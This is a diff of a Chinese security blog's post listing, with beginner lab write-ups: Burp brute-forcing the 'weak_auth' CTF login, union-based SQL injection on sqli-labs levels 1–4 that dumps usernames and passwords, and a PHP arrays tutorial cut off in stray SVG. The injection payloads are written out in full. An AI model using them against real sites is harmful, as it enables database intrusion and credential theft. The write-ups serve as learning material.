-<h1 id="二、weak-auth"><a href="#二、weak-auth" class="headerlink" title="二、weak_auth"></a>二、weak_auth</h1><p><img  src="https://img-blog.csdnimg.cn/20210313162934905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>根据题目提示本题考查的弱密码<br><img  src="https://img-blog.csdnimg.cn/20210313163341304.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看到登录名：admin,如果熟知弱密码的话可以随意尝试说不定就是答案哦！<br>在这里我们选择Brup进行爆破<br><img  src="https://img-blog.csdnimg.cn/20210313163630576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>发送后打开Intruder进行爆破</p>
-<p><img  src="https://img-blog.csdnimg.cn/20210313165822205.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p>通过长度的不同可以发现密码为：123456<br>账号：admin 密码：123456登录后打开得到flag<img  src="https://img-blog.csdnimg.cn/2021031316595291.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-
-      
+<article class="list">
+    <div class="list-time">
+        <a href="/2021/06/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA(webshell%E4%B8%8Eweak_auth)/">
+            2021-06-05
+        </a>
+    </div>
+    <div class="list-title">
+        <a href="/2021/06/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cweb%E6%96%B0%E6%89%8B%E5%8C%BA(webshell%E4%B8%8Eweak_auth)/">
+            攻防世界web新手区(webshell与weak_auth)
+        </a>
     </div>
 </article>
 
-    </li>
-  
-    <li>
-      <article class='ListView'>
-    <header class="title">
-      
-        <h1>
-          <a href="/2021/06/05/sqli-labs%E9%97%AF%E5%85%B31-4%E6%80%BB%E7%BB%93/">sqli-labs闯关1-4</a>
-        </h1>
-      
-      <div class='ListMeta'>
-  <time datetime="2021-06-05T07:48:17.550Z" itemprop="datePublished">
-    2021-06-05
-  </time>
-  
-  
-</div>
-
-    </header>
-    <div>
-      
-        <h1 id="一、第1-2关：基于错误的字符串-数字型注入"><a href="#一、第1-2关：基于错误的字符串-数字型注入" class="headerlink" title="一、第1-2关：基于错误的字符串/数字型注入"></a>一、第1-2关：基于错误的字符串/数字型注入</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">2.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">3.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">4.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">5.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_shcema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">6.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-number">0x23</span>,username,password)),<span class="hljs-number">3</span> form users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
-<p>第一关在之前学习：联合查询，以及示例因此从第二关开始记录。<br>其实第一关和第二关差别不大：闭合符合的差别。</p>
-<p><strong>判断注入点</strong><br><img  src="https://img-blog.csdnimg.cn/20210312204500947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210312204517868.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p><img  src="https://img-blog.csdnimg.cn/20210312204536142.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以判断为数字型注入<br><strong>确定属性列数目</strong><br>使用<code>?id=1 order by 数字 --+</code>不断尝试数字最大值<br><img  src="https://img-blog.csdnimg.cn/20210313094145196.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看到列数最大为三</p>
-<p><strong>确定回显属性</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 union select 1,2,3 --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210313094539526.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>回显属性为2，3</p>
-<p><strong>查找数据库</strong><br><img  src="https://img-blog.csdnimg.cn/20210313094807414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>看到数据库名：security</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">？id&#x3D;-1 union select 1,database(),3 --+<br></code></pre></td></tr></table></figure>
-<p><strong>查看表名</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210313095015810.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>获取列名</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210313095312949.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>获取字段信息</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 union select 1,group_concat(concat_ws(0x23,username,password)),3 from users --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210313095419677.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<h1 id="二、第三关"><a href="#二、第三关" class="headerlink" title="二、第三关"></a>二、第三关</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-string">&#x27;) order by 4 --+</span><br><span class="hljs-string">2.?id=-1 &#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">3.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-string">&#x27;) union select 1,database(),3 --+</span><br><span class="hljs-string">4.?id=-1 &#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">5.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> <span class="hljs-string">&#x27;) union select 1,group_concat(column_name),3 from information_shcema.columns where table_schema=database() and table_name=&#x27;</span>users<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">6.?id=-1 &#x27;</span>) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-number">0x23</span>,username,password)),<span class="hljs-number">3</span> form users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
-<p>本题与之前的题目的区别就在于闭合符号的不同这里使用：<code>&#39;)</code>来进行闭合。题目思路大概都差不多着重讲解一下起初如何判断<br><img  src="https://img-blog.csdnimg.cn/20210313100140176.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><img  src="https://img-blog.csdnimg.cn/20210313100200323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>可以看到无论是 <code>and 1=1 --+</code>还是<code>and 1=2 --+ </code>回显正常</p>
-<p><img  src="https://img-blog.csdnimg.cn/20210313100357280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>但是当输入<code>?id=1 &#39; --+</code>则出现异常因此可以判断为字符类注入<br>当<code>?id=1 &#39;) --+</code><img  src="https://img-blog.csdnimg.cn/20210313100634234.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>页面正常这说明：<strong>是以 (‘’)的方式闭合字符串的</strong><br>接下来便与1-2关无大差异，我们来看一下如何解题</p>
-<p><strong>确定属性列数目</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;1&#39;) order by 4 --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210313100925390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>判断列数为3</p>
-<p><strong>确定回显属性</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;-1&#39;) union select 1,2,3 --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210313101109202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>获取库名</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;-1&#39;) union select 1,database(),3 --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210313101207525.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>获取表名</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 &#39;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210313101333764.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>获取列名</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;-1&#39;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210313101516239.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>获取字段信息</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;-1&#39; )union select 1,group_concat(concat_ws(0x23,username,password)),3 from users --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210313101620556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<h1 id="三、第四关"><a href="#三、第四关" class="headerlink" title="三、第四关"></a>三、第四关</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> &quot;) order by 4 --+<br>2.?id=-1 &quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">3.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> &quot;) union select 1,database(),3 --+<br>4.?id=-1 &quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-comment">--+</span><br><span class="hljs-number">5.</span>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span> &quot;) union select 1,group_concat(column_name),3 from information_shcema.columns where table_schema=database() and table_name=&#x27;users&#x27; --+<br>6.?id=-1 &quot;) <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,group_concat(concat_ws(<span class="hljs-number">0x23</span>,username,password)),<span class="hljs-number">3</span> form users <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure>
-<p>第四关与第三关的区别就在于注入的字符类型在这里是：<code>  (&quot;&quot;)</code>进行闭合，接下来就开始吧。<br><strong>判断注入点</strong><br>大体上与第三关无差，当发现注入类型不是<strong>整型注入</strong>，进行字符类型判断<br>当输入<code>?id=1&quot; --+</code>时会发现出现错误<img  src="https://img-blog.csdnimg.cn/20210313102347801.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>因此使用：<code>?id=1 &quot;）--+</code>进行闭合<br><img  src="https://img-blog.csdnimg.cn/20210313102437168.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>显示正常，接下来开始操作</p>
-<p><strong>确定属性列数目</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;1&#39;) order by 4 --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210313102600341.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>列数为3</p>
-<p><strong>确定回显属性</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 &quot;) union select 1,2,3  --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210313102708472.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>获取库名</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 &quot;) union select 1,database(),3 --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210313102818938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br>库名为：security</p>
-<p><strong>获取表名</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 &quot;) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema&#x3D;&#39;security&#39; --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210313103247311.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-<p><strong>获取列名</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;-1&quot;) union select 1,group_concat(column_name),3 from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39; --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210313103543116.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span><br><strong>获取字段信息</strong></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?id&#x3D;-1 &quot;) union select 1,group_concat(concat_ws(0x23,username,password)),3 from users --+<br></code></pre></td></tr></table></figure>
-<p><img  src="https://img-blog.csdnimg.cn/20210313103803260.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70"  ><span class="image-caption">在这里插入图片描述</span></p>
-
-      
+<article class="list">
+    <div class="list-time">
+        <a href="/2021/06/05/sqli-labs%E9%97%AF%E5%85%B31-4%E6%80%BB%E7%BB%93/">
+            2021-06-05
+        </a>
+    </div>
+    <div class="list-title">
+        <a href="/2021/06/05/sqli-labs%E9%97%AF%E5%85%B31-4%E6%80%BB%E7%BB%93/">
+            sqli-labs闯关1-4
+        </a>
     </div>
 </article>
 
-    </li>
-  
-    <li>
-      <article class='ListView'>
-    <header class="title">
-      
-        <h1>
-          <a href="/2021/06/05/PHP%E5%85%A5%E9%97%A8%E9%98%B6%E6%AE%B5%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/">PHP入门学习阶段（二）</a>
-        </h1>
-      
-      <div class='ListMeta'>
-  <time datetime="2021-06-05T07:48:15.136Z" itemprop="datePublished">
-    2021-06-05
-  </time>
-  
-  
-</div>
-
-    </header>
-    <div>
-      
-        <h1 id="一、数组"><a href="#一、数组" class="headerlink" title="一、数组"></a>一、数组</h1><p>数组能够在单个变量中存储多个值。</p>
-<p>数组是什么：</p>
-<p>数组是一个能在单个变量中存储多个值的特殊变量。</p>
-<p>如果您有一个项目清单（例如：车名字的清单），将其存储到单个变量中</p>
-<p><strong>创建数组</strong><br>在 PHP 中，array() 函数用于创建数组：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">array();<br></code></pre></td></tr></table></figure>
-<p>在 PHP 中，有三种类型的数组：</p>
-<ul>
-<li>数值数组 - 带有数字 ID 键的数组</li>
-<li>关联数组 - 带有指定的键的数组，每个键关联一个值</li>
-<li>多维数组 - 包含一个或多个数组的数组</li>
-</ul>
-<p><strong>数值数组</strong><br>在数组中，有序列表总是从0开始设置：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">$cars&#x3D;array(&quot;we&quot;,&quot;her&quot;,&quot;she&quot;);<br>echo &quot;hello &quot; . <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="11.872ex" height="2.843ex" style="vertical-align: -0.838ex;" viewBox="0 -863.1 5111.3 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
-<title id="MathJax-SVG-1-Title">cars[0] . "," . </title>
-<defs aria-hidden="true">
-<path stroke-width="1" id="E1-MJMATHI-63" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-72" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
-<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-5B" d="M118 -250V750H255V710H158V-210H255V-250H118Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"></path>
-<path stroke-width="1" id="E1-MJMAIN-5D" d="M22 710V750H159V-250H22V-210H119V710H22Z"></path>
